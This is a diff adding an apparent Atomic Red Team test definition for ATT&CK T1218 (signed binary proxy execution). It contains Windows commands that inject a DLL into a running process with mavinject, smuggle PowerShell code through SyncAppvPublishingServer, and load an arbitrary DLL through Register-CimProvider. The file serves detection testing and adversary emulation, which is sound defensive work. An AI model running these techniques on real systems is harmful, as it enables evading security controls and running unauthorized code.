@@ -1,0 +1,59 @@
+---
+attack_technique: T1218
+display_name: Signed Binary Proxy Execution
+
+atomic_tests:
+- name: mavinject - Inject DLL into running process
+  description: |
+    Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    dll_payload:
+      description: DLL to inject
+      type: Path
+      default: C:\AtomicRedTeam\atomics\T1218\src\x64\T1218.dll
+    process_id:
+      description: PID of process receiving injection
+      type: string
+      default: 1000
+  executor:
+    name: command_prompt
+    command: |
+      mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}
+
+- name: SyncAppvPublishingServer - Execute arbitrary PowerShell code
+  description: |
+    Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. Requires Windows 10.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    powershell_code:
+      description: PowerShell code to execute
+      type: string
+      default: Start-Process calc.exe
+  executor:
+    name: command_prompt
+    command: |
+      SyncAppvPublishingServer.exe "n; #{powershell_code}"
+
+- name: Register-CimProvider - Execute evil dll 
+  description: |
+    Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    dll_payload:
+      description: DLL to execute
+      type: Path
+      default: C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll
+  executor:
+    name: command_prompt
+    command: |
+     C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload} 
